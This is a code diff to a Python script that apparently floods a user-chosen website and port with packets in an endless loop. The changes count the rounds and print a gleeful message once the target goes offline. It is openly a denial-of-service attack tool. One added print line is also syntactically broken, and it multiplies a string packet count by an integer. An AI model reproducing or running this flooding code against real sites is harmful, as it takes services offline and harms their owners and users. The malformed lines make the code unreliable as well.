@@ -38,9 +38,11 @@ def send_packets(website, port, packs):
         sock.close()
 
         if webstatus(website):
-            print(f"The website '{website}' is still online.")
+            print(f"Sended {packs} to {website}, but it is still online.")
         else:
-            print(f"The website '{website}' is closed or offline.")
+            print(f"Cool! The website '{website}' is closed or offline.")
+            print("You just sended ," packs * times, "Packets, WOW!")
+            exit(0)
     except socket.error as e:
         print(f"An error occurred: {str(e)}")
 
@@ -56,6 +58,7 @@ plc = find_port(service)
 print("available ports:", plc)
 port = int(input("Input port: "))
 packs = input("Input number of packets to be sent: ")
-
+times = 0
 while True:
+    times = times + 1
     send_packets(website, port, packs)
